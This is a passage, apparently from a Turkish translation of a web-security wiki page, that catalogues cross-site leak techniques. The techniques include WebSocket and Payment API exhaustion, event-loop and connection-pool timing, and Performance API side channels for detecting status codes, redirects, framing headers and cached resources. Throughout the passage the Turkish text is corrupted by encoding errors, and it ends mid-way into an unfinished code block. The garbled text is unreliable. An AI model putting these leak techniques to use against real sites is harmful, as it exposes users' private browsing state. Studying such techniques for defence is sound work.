Bir hedef sayfanÄ±n **WebSocket baÄŸlantÄ±larÄ±nÄ±** kullanÄ±p kullanmadÄ±ÄŸÄ±nÄ± ve ne kadarÄ±nÄ± kullandÄ±ÄŸÄ±nÄ± belirlemek mÃ¼mkÃ¼ndÃ¼r. Bu, bir saldÄ±rganÄ±n uygulama durumlarÄ±nÄ± tespit etmesine ve WebSocket baÄŸlantÄ± sayÄ±sÄ±na baÄŸlÄ± bilgileri sÄ±zdÄ±rmasÄ±na olanak tanÄ±r.

EÄŸer bir **kaynak** maksimum sayÄ±da WebSocket baÄŸlantÄ± nesnesi kullanÄ±yorsa, baÄŸlantÄ± durumlarÄ±ndan baÄŸÄ±msÄ±z olarak, **yeni nesnelerin oluÅŸturulmasÄ± JavaScript istisnalarÄ±na yol aÃ§ar**. Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in, saldÄ±rgan web sitesi hedef web sitesini bir pop-up veya iframe iÃ§inde aÃ§ar ve ardÄ±ndan hedef web yÃ¼klendikten sonra mÃ¼mkÃ¼n olan maksimum sayÄ±da WebSocket baÄŸlantÄ±sÄ± oluÅŸturmaya Ã§alÄ±ÅŸÄ±r. **AtÄ±lan istisnalarÄ±n sayÄ±sÄ±**, hedef web sitesinin kullandÄ±ÄŸÄ± **WebSocket baÄŸlantÄ± sayÄ±sÄ±dÄ±r**.

### Payment API

* **Inclusion Methods**: Frames, Pop-up'lar
* **Detectable Difference**: API KullanÄ±mÄ±
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: Sadece birinin aktif olabileceÄŸini tespit et.
* **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Bu XS-SÄ±zÄ±ntÄ±, bir saldÄ±rganÄ±n **bir Ã§apraz kaynak sayfasÄ±nÄ±n bir Ã¶deme talebi baÅŸlattÄ±ÄŸÄ±nÄ± tespit etmesine** olanak tanÄ±r.

Ã‡Ã¼nkÃ¼ **aynÄ± anda yalnÄ±zca bir Ã¶deme talebi aktif olabilir**, eÄŸer hedef web sitesi Payment Request API'sini kullanÄ±yorsa, bu API'yi kullanma giriÅŸimleri **baÅŸarÄ±sÄ±z olacak** ve bir **JavaScript istisnasÄ±** oluÅŸturacaktÄ±r. SaldÄ±rgan, **periyodik olarak Payment API UI'sini gÃ¶stermeye Ã§alÄ±ÅŸarak** bunu istismar edebilir. EÄŸer bir deneme bir istisna oluÅŸturursa, hedef web sitesi ÅŸu anda bunu kullanÄ±yor demektir. SaldÄ±rgan, UI'yi oluÅŸturduktan hemen sonra kapatarak bu periyodik denemeleri gizleyebilir.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Zamanlama (genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Summary:** Tek iÅŸ parÃ§acÄ±klÄ± JS olay dÃ¶ngÃ¼sÃ¼nÃ¼ kÃ¶tÃ¼ye kullanarak bir webin yÃ¼rÃ¼tme sÃ¼resini Ã¶lÃ§Ã¼n.
* **Code Example**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript, [tek iÅŸ parÃ§acÄ±klÄ± bir olay dÃ¶ngÃ¼sÃ¼](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) eÅŸzamanlÄ±lÄ±k modelinde Ã§alÄ±ÅŸÄ±r, bu da **sadece bir gÃ¶revi aynÄ± anda gerÃ§ekleÅŸtirebileceÄŸi** anlamÄ±na gelir. Bu Ã¶zellik, **farklÄ± bir kaynaktan gelen kodun Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ±n ne kadar sÃ¼rdÃ¼ÄŸÃ¼nÃ¼ Ã¶lÃ§mek iÃ§in istismar edilebilir**. Bir saldÄ±rgan, sabit Ã¶zelliklere sahip olaylarÄ± sÃ¼rekli olarak gÃ¶ndererek kendi kodunun olay dÃ¶ngÃ¼sÃ¼ndeki yÃ¼rÃ¼tme sÃ¼resini Ã¶lÃ§ebilir. Bu olaylar, olay havuzu boÅŸ olduÄŸunda iÅŸlenecektir. EÄŸer diÄŸer kaynaklar da aynÄ± havuza olay gÃ¶nderiyorsa, bir **saldÄ±rgan, kendi gÃ¶revlerinin yÃ¼rÃ¼tÃ¼lmesindeki gecikmeleri gÃ¶zlemleyerek bu dÄ±ÅŸ olaylarÄ±n yÃ¼rÃ¼tÃ¼lmesinin ne kadar sÃ¼rdÃ¼ÄŸÃ¼nÃ¼ Ã§Ä±karabilir**. Gecikmeleri izleme yÃ¶ntemi, farklÄ± kaynaklardan gelen kodun yÃ¼rÃ¼tme sÃ¼resini aÃ§Ä±ÄŸa Ã§Ä±karabilir ve potansiyel olarak hassas bilgileri sÄ±zdÄ±rabilir.

{% hint style="warning" %}
Bir yÃ¼rÃ¼tme zamanlamasÄ±nda, **daha kesin Ã¶lÃ§Ã¼mler** elde etmek iÃ§in **aÄŸ faktÃ¶rlerini ortadan kaldÄ±rmak** mÃ¼mkÃ¼ndÃ¼r. Ã–rneÄŸin, sayfa yÃ¼klenmeden Ã¶nce kullanÄ±lan kaynaklarÄ± yÃ¼kleyerek.
{% endhint %}

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Zamanlama (genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Summary:** Bir web iÅŸleminin yÃ¼rÃ¼tme sÃ¼resini Ã¶lÃ§menin bir yÃ¶ntemi, bir iÅŸ parÃ§acÄ±ÄŸÄ±nÄ±n olay dÃ¶ngÃ¼sÃ¼nÃ¼ kasÄ±tlÄ± olarak engellemek ve ardÄ±ndan **olay dÃ¶ngÃ¼sÃ¼nÃ¼n tekrar kullanÄ±labilir hale gelmesi iÃ§in ne kadar sÃ¼rdÃ¼ÄŸÃ¼nÃ¼** zamanlamaktÄ±r. Olay dÃ¶ngÃ¼sÃ¼ne bir engelleyici iÅŸlem (uzun bir hesaplama veya senkron API Ã§aÄŸrÄ±sÄ± gibi) ekleyerek ve sonraki kodun yÃ¼rÃ¼tÃ¼lmeye baÅŸlamasÄ± iÃ§in geÃ§en sÃ¼reyi izleyerek, engelleme sÃ¼resi boyunca olay dÃ¶ngÃ¼sÃ¼nde yÃ¼rÃ¼tÃ¼len gÃ¶revlerin sÃ¼resini Ã§Ä±karabilirsiniz. Bu teknik, JavaScript'in olay dÃ¶ngÃ¼sÃ¼nÃ¼n tek iÅŸ parÃ§acÄ±klÄ± doÄŸasÄ±nÄ± kullanÄ±r; burada gÃ¶revler sÄ±ralÄ± olarak yÃ¼rÃ¼tÃ¼lÃ¼r ve aynÄ± iÅŸ parÃ§acÄ±ÄŸÄ±nÄ± paylaÅŸan diÄŸer iÅŸlemlerin performansÄ± veya davranÄ±ÅŸÄ± hakkÄ±nda iÃ§gÃ¶rÃ¼ler saÄŸlayabilir.
* **Code Example**:

Olay dÃ¶ngÃ¼sÃ¼nÃ¼ kilitleyerek yÃ¼rÃ¼tme sÃ¼resini Ã¶lÃ§me tekniÄŸinin Ã¶nemli bir avantajÄ±, **Site Ä°zolasyonu**'nu aÅŸma potansiyelidir. **Site Ä°zolasyonu**, farklÄ± web sitelerini ayrÄ± sÃ¼reÃ§lere ayÄ±ran bir gÃ¼venlik Ã¶zelliÄŸidir ve kÃ¶tÃ¼ niyetli sitelerin diÄŸer sitelerden hassas verilere doÄŸrudan eriÅŸimini engellemeyi amaÃ§lar. Ancak, bir saldÄ±rgan, paylaÅŸÄ±lan olay dÃ¶ngÃ¼sÃ¼ aracÄ±lÄ±ÄŸÄ±yla baÅŸka bir kaynaÄŸÄ±n yÃ¼rÃ¼tme zamanlamasÄ±nÄ± etkileyerek, o kaynaÄŸÄ±n faaliyetleri hakkÄ±nda dolaylÄ± olarak bilgi Ã§Ä±karabilir. Bu yÃ¶ntem, diÄŸer kaynaÄŸÄ±n verilerine doÄŸrudan eriÅŸim gerektirmez, bunun yerine o kaynaÄŸÄ±n faaliyetlerinin paylaÅŸÄ±lan olay dÃ¶ngÃ¼sÃ¼ Ã¼zerindeki etkisini gÃ¶zlemler, bÃ¶ylece **Site Ä°zolasyonu** tarafÄ±ndan oluÅŸturulan koruyucu engellerden kaÃ§Ä±nÄ±r.

{% hint style="warning" %}
Bir yÃ¼rÃ¼tme zamanlamasÄ±nda, **daha kesin Ã¶lÃ§Ã¼mler** elde etmek iÃ§in **aÄŸ faktÃ¶rlerini ortadan kaldÄ±rmak** mÃ¼mkÃ¼ndÃ¼r. Ã–rneÄŸin, sayfa yÃ¼klenmeden Ã¶nce kullanÄ±lan kaynaklarÄ± yÃ¼kleyerek.
{% endhint %}

### Connection Pool

* **Inclusion Methods**: JavaScript Ä°stekleri
* **Detectable Difference**: Zamanlama (genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Summary:** Bir saldÄ±rgan, 1 hariÃ§ tÃ¼m soketleri kilitleyebilir, hedef web'i yÃ¼kleyebilir ve aynÄ± anda baÅŸka bir sayfayÄ± yÃ¼kleyebilir, son sayfanÄ±n yÃ¼klenmeye baÅŸlamasÄ± iÃ§in geÃ§en sÃ¼re, hedef sayfanÄ±n yÃ¼klenmesi iÃ§in geÃ§en sÃ¼redir.
* **Code Example**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

TarayÄ±cÄ±lar, sunucu iletiÅŸimi iÃ§in soketler kullanÄ±r, ancak iÅŸletim sistemi ve donanÄ±mÄ±n sÄ±nÄ±rlÄ± kaynaklarÄ± nedeniyle, **tarayÄ±cÄ±lar eÅŸzamanlÄ± soket sayÄ±sÄ±na bir sÄ±nÄ±r koymak zorundadÄ±r**. SaldÄ±rganlar bu sÄ±nÄ±rlamayÄ± aÅŸaÄŸÄ±daki adÄ±mlarla istismar edebilir:

1. TarayÄ±cÄ±nÄ±n soket limitini belirleyin, Ã¶rneÄŸin, 256 global soket.
2. 255 soketi uzun bir sÃ¼re boyunca, baÄŸlantÄ±larÄ± tamamlamadan aÃ§Ä±k tutacak ÅŸekilde, Ã§eÅŸitli ana bilgisayarlara 255 istek baÅŸlatarak doldurun.
3. Hedef sayfaya bir istek gÃ¶ndermek iÃ§in 256. soketi kullanÄ±n.
4. FarklÄ± bir ana bilgisayara 257. bir istek yapmaya Ã§alÄ±ÅŸÄ±n. TÃ¼m soketler kullanÄ±ldÄ±ÄŸÄ±ndan (2. ve 3. adÄ±mlara gÃ¶re), bu istek bir soket mevcut olana kadar bekleyecektir. Bu isteÄŸin ilerlemesi iÃ§in geÃ§en sÃ¼re, saldÄ±rgana 256. soketle (hedef sayfanÄ±n soketi) ilgili aÄŸ etkinliÄŸi hakkÄ±nda zamanlama bilgisi saÄŸlar. Bu Ã§Ä±karÄ±m, 2. adÄ±mda kullanÄ±lan 255 soketin hala meÅŸgul olmasÄ± nedeniyle mÃ¼mkÃ¼ndÃ¼r; bu da, yeni mevcut olan soketin 3. adÄ±mda serbest bÄ±rakÄ±lan soket olmasÄ± gerektiÄŸi anlamÄ±na gelir. 256. soketin mevcut hale gelmesi iÃ§in geÃ§en sÃ¼re, dolayÄ±sÄ±yla hedef sayfaya yapÄ±lan isteÄŸin tamamlanmasÄ± iÃ§in gereken sÃ¼reyle doÄŸrudan baÄŸlantÄ±lÄ±dÄ±r.

Daha fazla bilgi iÃ§in: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

* **Inclusion Methods**: JavaScript Ä°stekleri
* **Detectable Difference**: Zamanlama (genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **More info**:
* **Summary:** Ã–nceki teknikle aynÄ± ama tÃ¼m soketleri kullanmak yerine, Google **Chrome** aynÄ± kaynaÄŸa **6 eÅŸzamanlÄ± isteÄŸe** bir sÄ±nÄ±r koyar. EÄŸer **5'ini engellersek** ve sonra **6. bir istek baÅŸlatÄ±rsak**, bunu **zamanlayabiliriz** ve eÄŸer **kurban sayfasÄ±nÄ±n** aynÄ± uÃ§ noktaya daha fazla **istek gÃ¶ndermesini** saÄŸlarsak, **6. istek** **daha uzun** sÃ¼recektir ve bunu tespit edebiliriz.

## Performance API Techniques

[`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) web uygulamalarÄ±nÄ±n performans metrikleri hakkÄ±nda iÃ§gÃ¶rÃ¼ler sunar ve [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API) ile daha da zenginleÅŸtirilmiÅŸtir. Resource Timing API, isteklerin sÃ¼releri gibi ayrÄ±ntÄ±lÄ± aÄŸ isteÄŸi zamanlamalarÄ±nÄ± izlemeyi saÄŸlar. Ã–zellikle, sunucular yanÄ±tlarÄ±nda `Timing-Allow-Origin: *` baÅŸlÄ±ÄŸÄ±nÄ± iÃ§erdiÄŸinde, transfer boyutu ve alan adÄ± arama sÃ¼resi gibi ek veriler kullanÄ±labilir hale gelir.

Bu veri zenginliÄŸi, [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) veya [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName) gibi yÃ¶ntemler aracÄ±lÄ±ÄŸÄ±yla elde edilebilir ve performansla ilgili bilgilerin kapsamlÄ± bir gÃ¶rÃ¼nÃ¼mÃ¼nÃ¼ saÄŸlar. AyrÄ±ca, API, [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) ile elde edilen zaman damgalarÄ± arasÄ±ndaki farkÄ± hesaplayarak yÃ¼rÃ¼tme sÃ¼relerini Ã¶lÃ§meyi kolaylaÅŸtÄ±rÄ±r. Ancak, Chrome gibi bazÄ± tarayÄ±cÄ±larda `performance.now()`'un hassasiyetinin milisaniyelerle sÄ±nÄ±rlÄ± olabileceÄŸi ve bu durumun zamanlama Ã¶lÃ§Ã¼mlerinin ayrÄ±ntÄ±lÄ±ÄŸÄ±nÄ± etkileyebileceÄŸi unutulmamalÄ±dÄ±r.

Zamanlama Ã¶lÃ§Ã¼mlerinin Ã¶tesinde, Performance API gÃ¼venlikle ilgili iÃ§gÃ¶rÃ¼ler iÃ§in de kullanÄ±labilir. Ã–rneÄŸin, Chrome'daki `performance` nesnesindeki sayfalarÄ±n varlÄ±ÄŸÄ± veya yokluÄŸu, `X-Frame-Options` uygulandÄ±ÄŸÄ±nÄ± gÃ¶sterebilir. Ã–zellikle, bir sayfa `X-Frame-Options` nedeniyle bir Ã§erÃ§evede gÃ¶rÃ¼ntÃ¼lenmekten engellenirse, `performance` nesnesinde kaydedilmeyecektir, bu da sayfanÄ±n Ã§erÃ§eveleme politikalarÄ± hakkÄ±nda ince bir ipucu saÄŸlar.

### Error Leak

* **Inclusion Methods**: Frames, HTML ElemanlarÄ±
* **Detectable Difference**: Durum Kodu
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Hatalara neden olan bir istek, bir kaynak zamanlama giriÅŸi oluÅŸturmaz.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

HTTP yanÄ±t durum kodlarÄ± arasÄ±nda **ayrÄ±m yapmak mÃ¼mkÃ¼ndÃ¼r** Ã§Ã¼nkÃ¼ bir **hata** ile sonuÃ§lanan istekler **performans giriÅŸi** oluÅŸturmaz.

### Style Reload Error

* **Inclusion Methods**: HTML ElemanlarÄ±
* **Detectable Difference**: Durum Kodu
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Bir tarayÄ±cÄ± hatasÄ± nedeniyle, hatalara neden olan istekler iki kez yÃ¼klenir.
* **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Ã–nceki teknikte, GC'deki tarayÄ±cÄ± hatalarÄ±nÄ±n, **yÃ¼klenemeyen kaynaklarÄ±n iki kez yÃ¼klenmesine** neden olduÄŸu iki durum da tespit edilmiÅŸtir. Bu, Performans API'sinde birden fazla giriÅŸe neden olur ve bu nedenle tespit edilebilir.

### Request Merging Error

* **Inclusion Methods**: HTML ElemanlarÄ±
* **Detectable Difference**: Durum Kodu
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Hatalara neden olan istekler birleÅŸtirilemez.
* **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Bu teknik, bahsedilen belgede bir tabloda bulunmuÅŸtur ancak tekniÄŸin tanÄ±mÄ± bulunmamÄ±ÅŸtÄ±r. Ancak, [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak) adresinde kontrol ederek kaynak kodunu bulabilirsiniz.

### Empty Page Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Sayfa Ä°Ã§eriÄŸi
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** BoÅŸ yanÄ±tlar kaynak zamanlama giriÅŸleri oluÅŸturmaz.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Bir saldÄ±rgan, bir isteÄŸin boÅŸ bir HTTP yanÄ±t gÃ¶vdesi ile sonuÃ§lanÄ±p sonuÃ§lanmadÄ±ÄŸÄ±nÄ± tespit edebilir Ã§Ã¼nkÃ¼ **boÅŸ sayfalar bazÄ± tarayÄ±cÄ±larda performans giriÅŸi oluÅŸturmaz**.

### **XSS-Auditor Leak**

* **Inclusion Methods**: Frames
* **Detectable Difference**: Sayfa Ä°Ã§eriÄŸi
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** GÃ¼venlik Ä°ddialarÄ±nda XSS Denetleyicisi kullanarak, saldÄ±rganlar, oluÅŸturulan yÃ¼klerin denetleyicinin filtreleme mekanizmasÄ±nÄ± tetiklemesi durumunda yanÄ±tlarÄ±n deÄŸiÅŸimini gÃ¶zlemleyerek belirli web sayfasÄ± Ã¶ÄŸelerini tespit edebilir.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

GÃ¼venlik Ä°ddialarÄ±nda (SA), baÅŸlangÄ±Ã§ta Cross-Site Scripting (XSS) saldÄ±rÄ±larÄ±nÄ± Ã¶nlemek iÃ§in tasarlanmÄ±ÅŸ olan XSS Denetleyicisi, paradoksal olarak hassas bilgileri sÄ±zdÄ±rmak iÃ§in istismar edilebilir. Bu yerleÅŸik Ã¶zellik Google Chrome'dan (GC) kaldÄ±rÄ±lmÄ±ÅŸ olsa da, SA'da hala mevcuttur. 2013 yÄ±lÄ±nda Braun ve Heiderich, XSS Denetleyicisi'nin yanlÄ±ÅŸ pozitiflere yol aÃ§arak meÅŸru betikleri yanlÄ±ÅŸlÄ±kla engelleyebileceÄŸini gÃ¶stermiÅŸtir. Bunun Ã¼zerine araÅŸtÄ±rmacÄ±lar, bilgi Ã§Ä±karmak ve Ã§apraz kaynak sayfalarÄ±nda belirli iÃ§erikleri tespit etmek iÃ§in teknikler geliÅŸtirmiÅŸtir; bu kavram XS-SÄ±zÄ±ntÄ±larÄ± olarak bilinir ve ilk olarak Terada tarafÄ±ndan rapor edilmiÅŸ, Heyes tarafÄ±ndan bir blog yazÄ±sÄ±nda detaylandÄ±rÄ±lmÄ±ÅŸtÄ±r. Bu teknikler, GC'deki XSS Denetleyicisi'ne Ã¶zgÃ¼ olmasÄ±na raÄŸmen, SA'da XSS Denetleyicisi tarafÄ±ndan engellenen sayfalarÄ±n Performans API'sinde giriÅŸ oluÅŸturmadÄ±ÄŸÄ± keÅŸfedilmiÅŸtir; bu da hassas bilgilerin hala sÄ±zdÄ±rÄ±labileceÄŸi bir yÃ¶ntem sunar.

### X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: BaÅŸlÄ±k
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Summary:** X-Frame-Options baÅŸlÄ±ÄŸÄ±na sahip kaynak, kaynak zamanlama giriÅŸi oluÅŸturmaz.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

EÄŸer bir sayfanÄ±n **iframe** iÃ§inde **gÃ¶rÃ¼ntÃ¼lenmesine izin verilmezse**, bu **performans giriÅŸi** oluÅŸturmaz. SonuÃ§ olarak, bir saldÄ±rgan **`X-Frame-Options`** yanÄ±t baÅŸlÄ±ÄŸÄ±nÄ± tespit edebilir.\
AynÄ± ÅŸey bir **embed** **etiketi** kullanÄ±ldÄ±ÄŸÄ±nda da geÃ§erlidir.

### Download Detection

* **Inclusion Methods**: Frames
* **Detectable Difference**: BaÅŸlÄ±k
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Ä°ndirmeler, Performans API'sinde kaynak zamanlama giriÅŸleri oluÅŸturmaz.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

AynÄ± ÅŸekilde, iÃ§erik daÄŸÄ±tÄ±m baÅŸlÄ±ÄŸÄ± nedeniyle **indirilmiÅŸ bir kaynak** da **performans giriÅŸi** oluÅŸturmaz. Bu teknik tÃ¼m bÃ¼yÃ¼k tarayÄ±cÄ±larda Ã§alÄ±ÅŸÄ±r.

### Redirect Start Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: YÃ¶nlendirme
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Kaynak zamanlama giriÅŸi, bir yÃ¶nlendirmenin baÅŸlangÄ±Ã§ zamanÄ±nÄ± sÄ±zdÄ±rÄ±r.
* **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

BazÄ± tarayÄ±cÄ±larÄ±n Ã§apraz kaynak istekleri iÃ§in Ã§ok fazla bilgi kaydetme davranÄ±ÅŸÄ±nÄ± istismar eden bir XS-SÄ±zÄ±ntÄ± Ã¶rneÄŸi bulduk. Standart, Ã§apraz kaynaklÄ± kaynaklar iÃ§in sÄ±fÄ±ra ayarlanmasÄ± gereken bir dizi Ã¶zellik tanÄ±mlar. Ancak, **SA**'da, kullanÄ±cÄ±larÄ±n hedef sayfa tarafÄ±ndan **yÃ¶nlendirildiÄŸini** tespit etmek mÃ¼mkÃ¼ndÃ¼r; Performans API'sini sorgulayarak ve **redirectStart zamanlama verilerini** kontrol ederek.

### Duration Redirect Leak

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: YÃ¶nlendirme
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** YÃ¶nlendirme gerÃ§ekleÅŸtiÄŸinde zamanlama giriÅŸlerinin sÃ¼resi negatiftir.
* **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

GC'de, **yÃ¶nlendirme** ile sonuÃ§lanan isteklerin **sÃ¼resi** **negatif** olup, bu nedenle **yÃ¶nlendirme** ile sonuÃ§lanmayan isteklerden **ayrÄ±labilir**.

### CORP Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: BaÅŸlÄ±k
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** CORP ile korunan kaynaklar, kaynak zamanlama giriÅŸleri oluÅŸturmaz.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

BazÄ± durumlarda, **nextHopProtocol giriÅŸi** bir sÄ±zÄ±ntÄ± tekniÄŸi olarak kullanÄ±labilir. GC'de, **CORP baÅŸlÄ±ÄŸÄ±** ayarlandÄ±ÄŸÄ±nda, nextHopProtocol **boÅŸ** olacaktÄ±r. SA'nÄ±n, CORP etkin kaynaklar iÃ§in hiÃ§ performans giriÅŸi oluÅŸturmayacaÄŸÄ±nÄ± unutmayÄ±n.

### Service Worker

* **Inclusion Methods**: Frames
* **Detectable Difference**: API KullanÄ±mÄ±
* **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Summary:** Belirli bir kaynak iÃ§in bir hizmet Ã§alÄ±ÅŸanÄ±nÄ±n kaydedilip kaydedilmediÄŸini tespit edin.
* **Code Example**:

Hizmet Ã§alÄ±ÅŸanlarÄ±, bir kaynakta Ã§alÄ±ÅŸan olay odaklÄ± betik baÄŸlamlarÄ±dÄ±r. Bir web sayfasÄ±nÄ±n arka planÄ±nda Ã§alÄ±ÅŸÄ±r ve kaynaklarÄ± **yakalamak**, **deÄŸiÅŸtirmek** ve **Ã¶nbelleÄŸe almak** iÃ§in kullanÄ±labilir, bÃ¶ylece Ã§evrimdÄ±ÅŸÄ± web uygulamalarÄ± oluÅŸturur.\
EÄŸer bir **hizmet Ã§alÄ±ÅŸanÄ±** tarafÄ±ndan **Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ** bir **kaynaÄŸa** **iframe** aracÄ±lÄ±ÄŸÄ±yla eriÅŸilirse, kaynak **hizmet Ã§alÄ±ÅŸanÄ± Ã¶nbelleÄŸinden** **yÃ¼klenir**.\
KaynaÄŸÄ±n **hizmet Ã§alÄ±ÅŸanÄ±** Ã¶nbelleÄŸinden **yÃ¼klenip yÃ¼klenmediÄŸini** tespit etmek iÃ§in **Performans API'si** kullanÄ±labilir.\
Bu, bir Zamanlama saldÄ±rÄ±sÄ± ile de yapÄ±labilir (daha fazla bilgi iÃ§in belgeyi kontrol edin).

### Cache

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Zamanlama
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Summary:** Bir kaynaÄŸÄ±n Ã¶nbelleÄŸe alÄ±nÄ±p alÄ±nmadÄ±ÄŸÄ±nÄ± kontrol etmek mÃ¼mkÃ¼ndÃ¼r.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

[Performance API](xs-search.md#performance-api) kullanarak bir kaynaÄŸÄ±n Ã¶nbelleÄŸe alÄ±nÄ±p alÄ±nmadÄ±ÄŸÄ±nÄ± kontrol etmek mÃ¼mkÃ¼ndÃ¼r.

### Network Duration

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Sayfa Ä°Ã§eriÄŸi
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Summary:** `performance` API'sinden bir isteÄŸin aÄŸ sÃ¼resini almak mÃ¼mkÃ¼ndÃ¼r.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Error Messages Technique

### Media Error

* **Inclusion Methods**: HTML ElemanlarÄ± (Video, Ses)
* **Detectable Difference**: Durum Kodu
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Summary:** Firefox'ta, bir Ã§apraz kaynak isteÄŸinin durum kodunu doÄŸru bir ÅŸekilde sÄ±zdÄ±rmak mÃ¼mkÃ¼ndÃ¼r.
* **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
